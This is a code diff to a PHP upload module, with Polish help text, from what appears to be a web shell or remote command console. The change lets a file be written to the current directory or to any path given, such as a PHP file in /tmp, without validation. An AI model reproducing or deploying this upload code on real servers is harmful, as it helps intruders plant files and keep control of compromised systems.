@@ -39,7 +39,7 @@ class ModuleUpload extends ModuleAbstract
      */
     public static function getVersion()
     {
-        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-09 - <krzotr@gmail.com>';
     }
 
     /**
@@ -51,9 +51,10 @@ class ModuleUpload extends ModuleAbstract
     public static function getHelp()
     {
         return <<<DATA
-upload - Wrzucanie pliku na serwer
+upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki to plik zostanie wrzucony do katalogu, w którym się znajdujemy
 
     Użycie:
+        upload
         upload /tmp/plik.php
 DATA;
     }
@@ -66,15 +67,21 @@ DATA;
      */
     public function get()
     {
-        /**
-         * Zapis do pliku
-         */
-        if (($aFiledata = Request::getFiles('file')) !== FALSE) {
-            return move_uploaded_file($aFiledata['tmp_name'], $sFile);
+        if (($aFileData = Request::getFiles('file')) !== FALSE) {
+            $sUploadLocation = getcwd() . '/';
+
+            if ($this->oArgs->getNumberOfParams() === 0) {
+                $sUploadLocation .= basename($aFileData['name']);
+            } else {
+                $sUploadLocation = $this->oArgs->getParam(0);
+            }
+
+            return sprintf(
+                "Plik %swgrany",
+                (! @rename($aFileData['tmp_name'], $sUploadLocation) ? 'nie ' : '')
+            );
         }
-        /**
-         * Formularz
-         */
+
         return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
             '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
             '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
